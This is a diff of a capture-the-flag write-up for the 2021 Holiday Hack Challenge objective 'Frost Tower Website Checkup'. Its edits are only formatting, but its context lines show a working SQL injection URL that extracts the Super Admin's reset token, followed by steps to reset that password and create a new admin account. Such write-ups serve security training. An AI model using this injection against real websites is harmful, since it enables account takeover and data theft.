@@ -1,6 +1,6 @@
 # Objective 12: Frost Tower Website Checkup
-**Location: Studio, Frost Tower, 16<sup>th</sup> Floor, https://staging.jackfrosttower.com/**
-**Troll: Ingreta Tude**
+**Location: Studio, Frost Tower, 16<sup>th</sup> Floor, https://staging.jackfrosttower.com/**  
+**Troll: Ingreta Tude**  
 **Hints provided by Ribb Bonbowford after completion of [Elf Code Python](https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/Elf%20Code%20Python.md)**
 
 This objective is to perform a security assessment of the Frost Tower website with the [source code](https://download.holidayhackchallenge.com/2021/frosttower-web.zip) being provided.
@@ -134,7 +134,7 @@ The token for the Super Admin "root@localhost" can be retrieved using this URL:
 https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a join (select 2)b join (select 3)c join (select token from users where email="root@localhost")d join (select 4)e join (select 5)f join (select 6)g;--
 ```
 
-Using the URL https://staging.jackfrosttower.com/forgotpass/token/{retrieved token} it is possible to set a new password for the "Super Admin" user.
+Using the URL https://staging.jackfrosttower.com/forgotpass/token/{retrieved_token} it is possible to set a new password for the "Super Admin" user.
 Being logged on as this user, a new personalized user with "Super Admin" privileges can be created.
 
 **Achievement: Frost Tower Website Checkup**
